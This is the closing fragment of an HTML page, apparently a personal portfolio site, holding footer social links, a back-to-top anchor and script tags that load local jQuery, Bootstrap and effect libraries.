                         <li><a href="https://twitter.com/maycolanS" class="fa fa-twitter"></a></li>
                         <li><a href="https://s0b3k.github.io/" class="fa fa-dribbble"></a></li>
                    </ul>
               </div>
               
          </div>
     </div>
</footer>

<!-- Back top -->
<a href="#back-top" class="go-top"><i class="fa fa-angle-up"></i></a>

<!-- SCRIPTS -->

<script src="../js/jquery.js"></script>
<script src="../js/bootstrap.min.js"></script>
<script src="../js/particles.min.js"></script>
<script src="../js/app.js"></script>
<script src="../js/jquery.parallax.js"></script>
<script src="../js/smoothscroll.js"></script>
<script src="../js/custom.js"></script>

</body>
</html>